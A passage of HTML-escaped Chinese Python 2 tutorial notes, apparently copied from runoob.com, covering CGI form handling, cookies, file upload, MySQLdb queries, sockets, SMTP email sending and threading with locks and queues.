form.getvalue(&apos;name&apos;) site_url = form.getvalue(&apos;url&apos;) print &quot;Content-type:text/html&quot; print print &quot;&lt;html&gt;&quot; print &quot;&lt;head&gt;&quot; print &quot;&lt;meta charset=\&quot;utf-8\&quot;&gt;&quot; print &quot;&lt;title&gt;菜鸟教程 CGI 测试实例&lt;/title&gt;&quot; print &quot;&lt;/head&gt;&quot; print &quot;&lt;body&gt;&quot; print &quot;&lt;h2&gt;%s官网：%s&lt;/h2&gt;&quot; % (site_name, site_url) print &quot;&lt;/body&gt;&quot; print &quot;&lt;/html&gt;&quot; localhost/cgi-bin/hello_get.py?name=xxx&amp;url=http://www.xxx.com &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;/cgi-bin/hello_get.py&quot; method=&quot;get&quot;&gt; 站点名称: &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt; &lt;br /&gt; 站点 URL: &lt;input type=&quot;text&quot; name=&quot;url&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; chmod 755 hello_get.html get/post py传递写法一样 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;/cgi-bin/hello_get.py&quot; method=&quot;post&quot;&gt; 站点名称: &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt; &lt;br /&gt; 站点 URL: &lt;input type=&quot;text&quot; name=&quot;url&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 通过CGI程序传递checkbox数据 checkbox用于提交一个或者多个选项数据，HTML代码如下： &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;/cgi-bin/checkbox.py&quot; method=&quot;POST&quot; target=&quot;_blank&quot;&gt; &lt;input type=&quot;checkbox&quot; name=&quot;runoob&quot; value=&quot;on&quot; /&gt; 菜鸟教程 &lt;input type=&quot;checkbox&quot; name=&quot;google&quot; value=&quot;on&quot; /&gt; Google &lt;input type=&quot;submit&quot; value=&quot;选择站点&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; #!/usr/bin/python # -*- coding: UTF-8 -*- # 引入 CGI 处理模块 import cgi, cgitb # 创建 FieldStorage的实例 form = cgi.FieldStorage() # 接收字段数据 if form.getvalue(&apos;google&apos;): google_flag = &quot;是&quot; else: google_flag = &quot;否&quot; if form.getvalue(&apos;runoob&apos;): runoob_flag = &quot;是&quot; else: runoob_flag = &quot;否&quot; print &quot;Content-type:text/html&quot; print print &quot;&lt;html&gt;&quot; print &quot;&lt;head&gt;&quot; print &quot;&lt;meta charset=\&quot;utf-8\&quot;&gt;&quot; print &quot;&lt;title&gt;菜鸟教程 CGI 测试实例&lt;/title&gt;&quot; print &quot;&lt;/head&gt;&quot; print &quot;&lt;body&gt;&quot; print &quot;&lt;h2&gt; 菜鸟教程是否选择了 : %s&lt;/h2&gt;&quot; % runoob_flag print &quot;&lt;h2&gt; Google 是否选择了 : %s&lt;/h2&gt;&quot; % google_flag print &quot;&lt;/body&gt;&quot; print &quot;&lt;/html&gt;&quot; 通过CGI程序传递Radio数据 Radio 只向服务器传递一个数据，HTML代码如下： &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;/cgi-bin/radiobutton.py&quot; method=&quot;post&quot; target=&quot;_blank&quot;&gt; &lt;input type=&quot;radio&quot; name=&quot;site&quot; value=&quot;runoob&quot; /&gt; 菜鸟教程 &lt;input type=&quot;radio&quot; name=&quot;site&quot; value=&quot;google&quot; /&gt; Google &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; #!/usr/bin/python # -*- coding: UTF-8 -*- # 引入 CGI 处理模块 import cgi, cgitb # 创建 FieldStorage的实例 form = cgi.FieldStorage() # 接收字段数据 if form.getvalue(&apos;site&apos;): site = form.getvalue(&apos;site&apos;) else: site = &quot;提交数据为空&quot; print &quot;Content-type:text/html&quot; print print &quot;&lt;html&gt;&quot; print &quot;&lt;head&gt;&quot; print &quot;&lt;meta charset=\&quot;utf-8\&quot;&gt;&quot; print &quot;&lt;title&gt;菜鸟教程 CGI 测试实例&lt;/title&gt;&quot; print &quot;&lt;/head&gt;&quot; print &quot;&lt;body&gt;&quot; print &quot;&lt;h2&gt; 选中的网站是 %s&lt;/h2&gt;&quot; % site print &quot;&lt;/body&gt;&quot; print &quot;&lt;/html&gt;&quot; 通过CGI程序传递 Textarea 数据 Textarea 向服务器传递多行数据，HTML代码如下： &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;/cgi-bin/textarea.py&quot; method=&quot;post&quot; target=&quot;_blank&quot;&gt; &lt;textarea name=&quot;textcontent&quot; cols=&quot;40&quot; rows=&quot;4&quot;&gt; 在这里输入内容... &lt;/textarea&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; #!/usr/bin/python # -*- coding: UTF-8 -*- # 引入 CGI 处理模块 import cgi, cgitb # 创建 FieldStorage的实例 form = cgi.FieldStorage() # 接收字段数据 if form.getvalue(&apos;textcontent&apos;): text_content = form.getvalue(&apos;textcontent&apos;) else: text_content = &quot;没有内容&quot; print &quot;Content-type:text/html&quot; print print &quot;&lt;html&gt;&quot; print &quot;&lt;head&gt;&quot;; print &quot;&lt;meta charset=\&quot;utf-8\&quot;&gt;&quot; print &quot;&lt;title&gt;菜鸟教程 CGI 测试实例&lt;/title&gt;&quot; print &quot;&lt;/head&gt;&quot; print &quot;&lt;body&gt;&quot; print &quot;&lt;h2&gt; 输入的内容是：%s&lt;/h2&gt;&quot; % text_content print &quot;&lt;/body&gt;&quot; print &quot;&lt;/html&gt;&quot; 通过CGI程序传递下拉数据。 HTML 下拉框代码如下： &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;/cgi-bin/dropdown.py&quot; method=&quot;post&quot; target=&quot;_blank&quot;&gt; &lt;select name=&quot;dropdown&quot;&gt; &lt;option value=&quot;runoob&quot; selected&gt;菜鸟教程&lt;/option&gt; &lt;option value=&quot;google&quot;&gt;Google&lt;/option&gt; &lt;/select&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot;/&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; #!/usr/bin/python # -*- coding: UTF-8 -*- # 引入 CGI 处理模块 import cgi, cgitb # 创建 FieldStorage的实例 form = cgi.FieldStorage() # 接收字段数据 if form.getvalue(&apos;dropdown&apos;): dropdown_value = form.getvalue(&apos;dropdown&apos;) else: dropdown_value = &quot;没有内容&quot; print &quot;Content-type:text/html&quot; print print &quot;&lt;html&gt;&quot; print &quot;&lt;head&gt;&quot; print &quot;&lt;meta charset=\&quot;utf-8\&quot;&gt;&quot; print &quot;&lt;title&gt;菜鸟教程 CGI 测试实例&lt;/title&gt;&quot; print &quot;&lt;/head&gt;&quot; print &quot;&lt;body&gt;&quot; print &quot;&lt;h2&gt; 选中的选项是：%s&lt;/h2&gt;&quot; % dropdown_value print &quot;&lt;/body&gt;&quot; print &quot;&lt;/html&gt;&quot; cookie的语法 http cookie的发送是通过http头部来实现的，他早于文件的传递，头部set-cookie的语法如下： Set-cookie:name=name;expires=date;path=path;domain=domain;secure name=name: 需要设置cookie的值(name不能使用&quot;;&quot;和&quot;,&quot;号),有多个name值时用 &quot;;&quot; 分隔，例如：name1=name1;name2=name2;name3=name3。 expires=date: cookie的有效期限,格式： expires=&quot;Wdy,DD-Mon-YYYY HH:MM:SS&quot; path=path: 设置cookie支持的路径,如果path是一个路径，则cookie对这个目录下的所有文件及子目录生效，例如： path=&quot;/cgi-bin/&quot;，如果path是一个文件，则cookie指对这个文件生效，例如：path=&quot;/cgi-bin/cookie.cgi&quot;。 domain=domain: 对cookie生效的域名，例如：domain=&quot;www.runoob.com&quot; secure: 如果给出此标志，表示cookie只能通过SSL协议的https服务器来传递。 cookie的接收是通过设置环境变量HTTP_COOKIE来实现的，CGI程序可以通过检索该变量获取cookie信息。 #!/usr/bin/python # -*- coding: UTF-8 -*- # print &apos;Content-Type: text/html&apos; print &apos;Set-Cookie: name=&quot;菜鸟教程&quot;;expires=Wed, 28 Aug 2016 18:30:00 GMT&apos; print print &quot;&quot;&quot; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Cookie set OK!&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt; &quot;&quot;&quot; 以下是一个简单的CGI检索cookie信息的程序： #!/usr/bin/python # -*- coding: UTF-8 -*- # 导入模块 import os import Cookie print &quot;Content-type: text/html&quot; print print &quot;&quot;&quot; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;读取cookie信息&lt;/h1&gt; &quot;&quot;&quot; if &apos;HTTP_COOKIE&apos; in os.environ: cookie_string=os.environ.get(&apos;HTTP_COOKIE&apos;) c=Cookie.SimpleCookie() c.load(cookie_string) try: data=c[&apos;name&apos;].value print &quot;cookie data: &quot;+data+&quot;&lt;br&gt;&quot; except KeyError: print &quot;cookie 没有设置或者已过去&lt;br&gt;&quot; print &quot;&quot;&quot; &lt;/body&gt; &lt;/html&gt; &quot;&quot;&quot; 文件上传实例 HTML设置上传文件的表单需要设置 enctype 属性为 multipart/form-data，代码如下所示： &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form enctype=&quot;multipart/form-data&quot; action=&quot;/cgi-bin/save_file.py&quot; method=&quot;post&quot;&gt; &lt;p&gt;选中文件: &lt;input type=&quot;file&quot; name=&quot;filename&quot; /&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=&quot;submit&quot; value=&quot;上传&quot; /&gt;&lt;/p&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; #!/usr/bin/python # -*- coding: UTF-8 -*- import cgi, os import cgitb; cgitb.enable() form = cgi.FieldStorage() # 获取文件名 fileitem = form[&apos;filename&apos;] # 检测文件是否上传 if fileitem.filename: # 设置文件路径 # 如果你使用的系统是Unix/Linux，你必须替换文件分隔符，在window下只需要使用open()语句即可： # fn = os.path.basename(fileitem.filename.replace(&quot;\\&quot;, &quot;/&quot; )) fn = os.path.basename(fileitem.filename) open(&apos;/tmp/&apos; + fn, &apos;wb&apos;).write(fileitem.file.read()) message = &apos;文件 &quot;&apos; + fn + &apos;&quot; 上传成功&apos; else: message = &apos;文件没有上传&apos; print &quot;&quot;&quot;\ Content-Type: text/html\n &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;%s&lt;/p&gt; &lt;/body&gt; &lt;/html&gt; &quot;&quot;&quot; % (message,) 文件下载对话框 #!/usr/bin/python # -*- coding: UTF-8 -*- # HTTP 头部 print &quot;Content-Disposition: attachment; filename=\&quot;foo.txt\&quot;&quot;; print # 打开文件 fo = open(&quot;foo.txt&quot;, &quot;rb&quot;) str = fo.read(); print str # 关闭文件 fo.close() python MYSQL MySQLdb 是用于Python链接Mysql数据库的接口 安装MySQLdb，请访问 http://sourceforge.net/projects/mysql-python ，(Linux平台可以访问：https://pypi.python.org/pypi/MySQL-python)从这里可选择适合您的平台的安装包，分为预编译的二进制文件和源代码安装包。 如果您选择二进制文件发行版本的话，安装过程基本安装提示即可完成。如果从源代码进行安装的话，则需要切换到MySQLdb发行版本的顶级目录，并键入下列命令: $ gunzip MySQL-python-1.2.2.tar.gz $ tar -xvf MySQL-python-1.2.2.tar $ cd MySQL-python-1.2.2 $ python setup.py build $ python setup.py install #!/usr/bin/python # -*- coding: UTF-8 -*- import MySQLdb # 打开数据库连接 db = MySQLdb.connect(&quot;localhost&quot;, &quot;testuser&quot;, &quot;test123&quot;, &quot;TESTDB&quot;, charset=&apos;utf8&apos; ) # 使用cursor()方法获取操作游标 cursor = db.cursor() # 使用execute方法执行SQL语句 cursor.execute(&quot;SELECT VERSION()&quot;) # 使用 fetchone() 方法获取一条数据 data = cursor.fetchone() print &quot;Database version : %s &quot; % data # 关闭数据库连接 db.close() 创建数据库表 如果数据库连接存在我们可以使用execute()方法来为数据库创建表，如下所示创建表EMPLOYEE： #!/usr/bin/python # -*- coding: UTF-8 -*- import MySQLdb # 打开数据库连接 db = MySQLdb.connect(&quot;localhost&quot;, &quot;testuser&quot;, &quot;test123&quot;, &quot;TESTDB&quot;, charset=&apos;utf8&apos; ) # 使用cursor()方法获取操作游标 cursor = db.cursor() # 如果数据表已经存在使用 execute() 方法删除表。 cursor.execute(&quot;DROP TABLE IF EXISTS EMPLOYEE&quot;) # 创建数据表SQL语句 sql = &quot;&quot;&quot;CREATE TABLE EMPLOYEE ( FIRST_NAME CHAR(20) NOT NULL, LAST_NAME CHAR(20), AGE INT, SEX CHAR(1), INCOME FLOAT )&quot;&quot;&quot; cursor.execute(sql) # 关闭数据库连接 db.close() 数据库插入操作 以下实例使用执行 SQL INSERT 语句向表 EMPLOYEE 插入记录： #!/usr/bin/python # -*- coding: UTF-8 -*- import MySQLdb # 打开数据库连接 db = MySQLdb.connect(&quot;localhost&quot;, &quot;testuser&quot;, &quot;test123&quot;, &quot;TESTDB&quot;, charset=&apos;utf8&apos; ) # 使用cursor()方法获取操作游标 cursor = db.cursor() # SQL 插入语句 # sql = &quot;INSERT INTO EMPLOYEE(FIRST_NAME, \ LAST_NAME, AGE, SEX, INCOME) \ VALUES (&apos;%s&apos;, &apos;%s&apos;, &apos;%d&apos;, &apos;%c&apos;, &apos;%d&apos; )&quot; % \ (&apos;Mac&apos;, &apos;Mohan&apos;, 20, &apos;M&apos;, 2000) sql = &quot;&quot;&quot;INSERT INTO EMPLOYEE(FIRST_NAME, LAST_NAME, AGE, SEX, INCOME) VALUES (&apos;Mac&apos;, &apos;Mohan&apos;, 20, &apos;M&apos;, 2000)&quot;&quot;&quot; try: # 执行sql语句 cursor.execute(sql) # 提交到数据库执行 db.commit() except: # Rollback in case there is any error db.rollback() # 关闭数据库连接 db.close() 数据库查询操作 fetchone(): 该方法获取下一个查询结果集。结果集是一个对象 fetchall():接收全部的返回结果行. rowcount: 这是一个只读属性，并返回执行execute()方法后影响的行数。 数据库更新操作 #!/usr/bin/python # -*- coding: UTF-8 -*- import MySQLdb # 打开数据库连接 db = MySQLdb.connect(&quot;localhost&quot;, &quot;testuser&quot;, &quot;test123&quot;, &quot;TESTDB&quot;, charset=&apos;utf8&apos; ) # 使用cursor()方法获取操作游标 cursor = db.cursor() # SQL 更新语句 sql = &quot;UPDATE EMPLOYEE SET AGE = AGE + 1 WHERE SEX = &apos;%c&apos;&quot; % (&apos;M&apos;) try: # 执行SQL语句 cursor.execute(sql) # 提交到数据库执行 db.commit() except: # 发生错误时回滚 db.rollback() # 关闭数据库连接 db.close() 删除操作 #!/usr/bin/python # -*- coding: UTF-8 -*- import MySQLdb # 打开数据库连接 db = MySQLdb.connect(&quot;localhost&quot;, &quot;testuser&quot;, &quot;test123&quot;, &quot;TESTDB&quot;, charset=&apos;utf8&apos; ) # 使用cursor()方法获取操作游标 cursor = db.cursor() # SQL 删除语句 sql = &quot;DELETE FROM EMPLOYEE WHERE AGE &gt; &apos;%d&apos;&quot; % (20) try: # 执行SQL语句 cursor.execute(sql) # 提交修改 db.commit() except: # 发生错误时回滚 db.rollback() # 关闭连接 db.close() Python 网络编程 Python 提供了两个级别访问的网络服务。： 低级别的网络服务支持基本的 Socket，它提供了标准的 BSD Sockets API，可以访问底层操作系统Socket接口的全部方法。 高级别的网络服务模块 SocketServer， 它提供了服务器中心类，可以简化网络服务器的开发。 什么是 Socket? Socket又称&quot;套接字&quot;，应用程序通常通过&quot;套接字&quot;向网络发出请求或者应答网络请求，使主机间或者一台计算机上的进程间可以通讯。 服务端： #!/usr/bin/python # -*- coding: UTF-8 -*- # 文件名：server.py import socket # 导入 socket 模块 s = socket.socket() # 创建 socket 对象 host = socket.gethostname() # 获取本地主机名 port = 12345 # 设置端口 s.bind((host, port)) # 绑定端口 s.listen(5) # 等待客户端连接 while True: c, addr = s.accept() # 建立客户端连接。 print &apos;连接地址：&apos;, addr c.send(&apos;欢迎访问菜鸟教程！&apos;) c.close() # 关闭连接 客户端： #!/usr/bin/python # -*- coding: UTF-8 -*- # 文件名：client.py import socket # 导入 socket 模块 s = socket.socket() # 创建 socket 对象 host = socket.gethostname() # 获取本地主机名 port = 12345 # 设置端口好 s.connect((host, port)) print s.recv(1024) s.close() 第一个终端执行 server.py 文件： $ python server.py 第二个终端执行 client.py 文件： $ python client.py 欢迎访问菜鸟教程！ 这时我们再打开第一个终端，就会看到有以下信息输出： 连接地址： (&apos;192.168.0.118&apos;, 62461) Python SMTP发送邮件 SMTP（Simple Mail Transfer Protocol）即简单邮件传输协议,它是一组用于由源地址到目的地址传送邮件的规则，由它来控制信件的中转方式。 python的smtplib提供了一种很方便的途径发送电子邮件。它对smtp协议进行了简单的封装。 Python SMTP 对象使用 sendmail 方法发送邮件，语法如下： SMTP.sendmail(from_addr, to_addrs, msg[, mail_options, rcpt_options]) 参数说明： from_addr: 邮件发送者地址。 to_addrs: 字符串列表，邮件发送地址。 msg: 发送消息 需要你本机已安装了支持 SMTP 的服务 #!/usr/bin/python # -*- coding: UTF-8 -*- import smtplib from email.mime.text import MIMEText from email.header import Header sender = &apos;from@runoob.com&apos; receivers = [&apos;429240967@qq.com&apos;] # 接收邮件，可设置为你的QQ邮箱或者其他邮箱 # 三个参数：第一个为文本内容，第二个 plain 设置文本格式，第三个 utf-8 设置编码 message = MIMEText(&apos;Python 邮件发送测试...&apos;, &apos;plain&apos;, &apos;utf-8&apos;) message[&apos;From&apos;] = Header(&quot;菜鸟教程&quot;, &apos;utf-8&apos;) # 发送者 message[&apos;To&apos;] = Header(&quot;测试&quot;, &apos;utf-8&apos;) # 接收者 subject = &apos;Python SMTP 邮件测试&apos; message[&apos;Subject&apos;] = Header(subject, &apos;utf-8&apos;) try: smtpObj = smtplib.SMTP(&apos;localhost&apos;) smtpObj.sendmail(sender, receivers, message.as_string()) print &quot;邮件发送成功&quot; except smtplib.SMTPException: print &quot;Error: 无法发送邮件&quot; 如果我们本机没有 sendmail 访问，也可以使用其他邮件服务商的 SMTP 访问（QQ、网易、Google等）。 #!/usr/bin/python # -*- coding: UTF-8 -*- import smtplib from email.mime.text import MIMEText from email.header import Header # 第三方 SMTP 服务 mail_host=&quot;smtp.XXX.com&quot; #设置服务器 mail_user=&quot;XXXX&quot; #用户名 mail_pass=&quot;XXXXXX&quot; #口令 sender = &apos;from@runoob.com&apos; receivers = [&apos;429240967@qq.com&apos;] # 接收邮件，可设置为你的QQ邮箱或者其他邮箱 message = MIMEText(&apos;Python 邮件发送测试...&apos;, &apos;plain&apos;, &apos;utf-8&apos;) message[&apos;From&apos;] = Header(&quot;菜鸟教程&quot;, &apos;utf-8&apos;) message[&apos;To&apos;] = Header(&quot;测试&quot;, &apos;utf-8&apos;) subject = &apos;Python SMTP 邮件测试&apos; message[&apos;Subject&apos;] = Header(subject, &apos;utf-8&apos;) try: smtpObj = smtplib.SMTP() smtpObj.connect(mail_host, 25) # 25 为 SMTP 端口号 smtpObj.login(mail_user,mail_pass) smtpObj.sendmail(sender, receivers, message.as_string()) print &quot;邮件发送成功&quot; except smtplib.SMTPException: print &quot;Error: 无法发送邮件&quot; 使用Python发送HTML格式的邮件 mail_msg = &quot;&quot;&quot; &lt;p&gt;Python 邮件发送测试...&lt;/p&gt; &lt;p&gt;&lt;a href=&quot;http://www.runoob.com&quot;&gt;这是一个链接&lt;/a&gt;&lt;/p&gt; &quot;&quot;&quot; message = MIMEText(mail_msg, &apos;html&apos;, &apos;utf-8&apos;) Python 发送带附件的邮件 #!/usr/bin/python # -*- coding: UTF-8 -*- import smtplib from email.mime.text import MIMEText from email.mime.multipart import MIMEMultipart from email.header import Header sender = &apos;from@runoob.com&apos; receivers = [&apos;429240967@qq.com&apos;] # 接收邮件，可设置为你的QQ邮箱或者其他邮箱 #创建一个带附件的实例 message = MIMEMultipart() message[&apos;From&apos;] = Header(&quot;菜鸟教程&quot;, &apos;utf-8&apos;) message[&apos;To&apos;] = Header(&quot;测试&quot;, &apos;utf-8&apos;) subject = &apos;Python SMTP 邮件测试&apos; message[&apos;Subject&apos;] = Header(subject, &apos;utf-8&apos;) #邮件正文内容 message.attach(MIMEText(&apos;这是菜鸟教程Python 邮件发送测试……&apos;, &apos;plain&apos;, &apos;utf-8&apos;)) # 构造附件1，传送当前目录下的 test.txt 文件 att1 = MIMEText(open(&apos;test.txt&apos;, &apos;rb&apos;).read(), &apos;base64&apos;, &apos;utf-8&apos;) att1[&quot;Content-Type&quot;] = &apos;application/octet-stream&apos; # 这里的filename可以任意写，写什么名字，邮件中显示什么名字 att1[&quot;Content-Disposition&quot;] = &apos;attachment; filename=&quot;test.txt&quot;&apos; message.attach(att1) # 构造附件2，传送当前目录下的 runoob.txt 文件 att2 = MIMEText(open(&apos;runoob.txt&apos;, &apos;rb&apos;).read(), &apos;base64&apos;, &apos;utf-8&apos;) att2[&quot;Content-Type&quot;] = &apos;application/octet-stream&apos; att2[&quot;Content-Disposition&quot;] = &apos;attachment; filename=&quot;runoob.txt&quot;&apos; message.attach(att2) try: smtpObj = smtplib.SMTP(&apos;localhost&apos;) smtpObj.sendmail(sender, receivers, message.as_string()) print &quot;邮件发送成功&quot; except smtplib.SMTPException: print &quot;Error: 无法发送邮件&quot; 在 HTML 文本中添加图片 #!/usr/bin/python # -*- coding: UTF-8 -*- import smtplib from email.mime.image import MIMEImage from email.mime.multipart import MIMEMultipart from email.mime.text import MIMEText from email.header import Header sender = &apos;from@runoob.com&apos; receivers = [&apos;429240967@qq.com&apos;] # 接收邮件，可设置为你的QQ邮箱或者其他邮箱 msgRoot = MIMEMultipart(&apos;related&apos;) msgRoot[&apos;From&apos;] = Header(&quot;菜鸟教程&quot;, &apos;utf-8&apos;) msgRoot[&apos;To&apos;] = Header(&quot;测试&quot;, &apos;utf-8&apos;) subject = &apos;Python SMTP 邮件测试&apos; msgRoot[&apos;Subject&apos;] = Header(subject, &apos;utf-8&apos;) msgAlternative = MIMEMultipart(&apos;alternative&apos;) msgRoot.attach(msgAlternative) mail_msg = &quot;&quot;&quot; &lt;p&gt;Python 邮件发送测试...&lt;/p&gt; &lt;p&gt;&lt;a href=&quot;http://www.runoob.com&quot;&gt;菜鸟教程链接&lt;/a&gt;&lt;/p&gt; &lt;p&gt;图片演示：&lt;/p&gt; &lt;p&gt;&lt;img src=&quot;cid:image1&quot;&gt;&lt;/p&gt; &quot;&quot;&quot; msgAlternative.attach(MIMEText(mail_msg, &apos;html&apos;, &apos;utf-8&apos;)) # 指定图片为当前目录 fp = open(&apos;test.png&apos;, &apos;rb&apos;) msgImage = MIMEImage(fp.read()) fp.close() # 定义图片 ID，在 HTML 文本中引用 msgImage.add_header(&apos;Content-ID&apos;, &apos;&lt;image1&gt;&apos;) msgRoot.attach(msgImage) try: smtpObj = smtplib.SMTP(&apos;localhost&apos;) smtpObj.sendmail(sender, receivers, msgRoot.as_string()) print &quot;邮件发送成功&quot; except smtplib.SMTPException: print &quot;Error: 无法发送邮件&quot; 使用第三方 SMTP 服务发送 #!/usr/bin/python # -*- coding: UTF-8 -*- import smtplib from email.mime.text import MIMEText from email.utils import formataddr my_sender=&apos;429240967@qq.com&apos; # 发件人邮箱账号 my_pass = &apos;xxxxxxxxxx&apos; # 发件人邮箱密码 my_user=&apos;429240967@qq.com&apos; # 收件人邮箱账号，我这边发送给自己 def mail(): ret=True try: msg=MIMEText(&apos;填写邮件内容&apos;,&apos;plain&apos;,&apos;utf-8&apos;) msg[&apos;From&apos;]=formataddr([&quot;FromRunoob&quot;,my_sender]) # 括号里的对应发件人邮箱昵称、发件人邮箱账号 msg[&apos;To&apos;]=formataddr([&quot;FK&quot;,my_user]) # 括号里的对应收件人邮箱昵称、收件人邮箱账号 msg[&apos;Subject&apos;]=&quot;菜鸟教程发送邮件测试&quot; # 邮件的主题，也可以说是标题 server=smtplib.SMTP_SSL(&quot;smtp.qq.com&quot;, 465) # 发件人邮箱中的SMTP服务器，端口是25 server.login(my_sender, my_pass) # 括号中对应的是发件人邮箱账号、邮箱密码 server.sendmail(my_sender,[my_user,],msg.as_string()) # 括号中对应的是发件人邮箱账号、收件人邮箱账号、发送邮件 server.quit() # 关闭连接 except Exception: # 如果 try 中的语句没有执行，则会执行下面的 ret=False ret=False return ret ret=mail() if ret: print(&quot;邮件发送成功&quot;) else: print(&quot;邮件发送失败&quot;) python多线程： Python中使用线程有两种方式：函数或者用类来包装线程对象。 #!/usr/bin/python # -*- coding: UTF-8 -*- import thread import time # 为线程定义一个函数 def print_time( threadName, delay): count = 0 while count &lt; 5: time.sleep(delay) count += 1 print &quot;%s: %s&quot; % ( threadName, time.ctime(time.time()) ) # 创建两个线程 try: thread.start_new_thread( print_time, (&quot;Thread-1&quot;, 2, ) ) thread.start_new_thread( print_time, (&quot;Thread-2&quot;, 4, ) ) except: print &quot;Error: unable to start thread&quot; while 1: pass 线程模块 Python通过两个标准库thread和threading提供对线程的支持。thread提供了低级别的、原始的线程以及一个简单的锁。 threading 模块提供的其他方法： threading.currentThread(): 返回当前的线程变量。 threading.enumerate(): 返回一个包含正在运行的线程的list。正在运行指线程启动后、结束前，不包括启动前和终止后的线程。 threading.activeCount(): 返回正在运行的线程数量，与len(threading.enumerate())有相同的结果。 除了使用方法外，线程模块同样提供了Thread类来处理线程，Thread类提供了以下方法: run(): 用以表示线程活动的方法。 start():启动线程活动。 join([time]): 等待至线程中止。这阻塞调用线程直至线程的join() 方法被调用中止-正常退出或者抛出未处理的异常-或者是可选的超时发生。 isAlive(): 返回线程是否活动的。 getName(): 返回线程名。 setName(): 设置线程名。 使用Threading模块创建线程 使用Threading模块创建线程，直接从threading.Thread继承，然后重写__init__方法和run方法 #!/usr/bin/python # -*- coding: UTF-8 -*- import threading import time exitFlag = 0 class myThread (threading.Thread): #继承父类threading.Thread def __init__(self, threadID, name, counter): threading.Thread.__init__(self) self.threadID = threadID self.name = name self.counter = counter def run(self): #把要执行的代码写到run函数里面 线程在创建后会直接运行run函数 print &quot;Starting &quot; + self.name print_time(self.name, self.counter, 5) print &quot;Exiting &quot; + self.name def print_time(threadName, delay, counter): while counter: if exitFlag: (threading.Thread).exit() time.sleep(delay) print &quot;%s: %s&quot; % (threadName, time.ctime(time.time())) counter -= 1 # 创建新线程 thread1 = myThread(1, &quot;Thread-1&quot;, 1) thread2 = myThread(2, &quot;Thread-2&quot;, 2) # 开启线程 thread1.start() thread2.start() print &quot;Exiting Main Thread&quot; 线程同步： #!/usr/bin/python # -*- coding: UTF-8 -*- import threading import time class myThread (threading.Thread): def __init__(self, threadID, name, counter): threading.Thread.__init__(self) self.threadID = threadID self.name = name self.counter = counter def run(self): print &quot;Starting &quot; + self.name # 获得锁，成功获得锁定后返回True # 可选的timeout参数不填时将一直阻塞直到获得锁定 # 否则超时后将返回False threadLock.acquire() print_time(self.name, self.counter, 3) # 释放锁 threadLock.release() def print_time(threadName, delay, counter): while counter: time.sleep(delay) print &quot;%s: %s&quot; % (threadName, time.ctime(time.time())) counter -= 1 threadLock = threading.Lock() threads = [] # 创建新线程 thread1 = myThread(1, &quot;Thread-1&quot;, 1) thread2 = myThread(2, &quot;Thread-2&quot;, 2) # 开启新线程 thread1.start() thread2.start() # 添加线程到线程列表 threads.append(thread1) threads.append(thread2) # 等待所有线程完成 for t in threads: t.join() print &quot;Exiting Main Thread&quot; 线程优先级队列（ Queue） Queue.qsize() 返回队列的大小 Queue.empty() 如果队列为空，返回True,反之False Queue.full() 如果队列满了，返回True,反之False Queue.full 与 maxsize 大小对应 Queue.get([block[, timeout]])获取队列，timeout等待时间 Queue.get_nowait() 相当Queue.get(False) Queue.put(item) 写入队列，timeout等待时间 Queue.put_nowait(item) 相当Queue.put(item, False) Queue.task_done() 在完成一项工作之后，Queue.task_done()函数向任务已经完成的队列发送一个信号 Queue.join() 实际上意味着等到队列为空，再执行别的操作 #!/usr/bin/python # -*- coding: UTF-8 -*- import Queue import threading import time exitFlag = 0 class myThread (threading.Thread): def __init__(self, threadID, name, q): 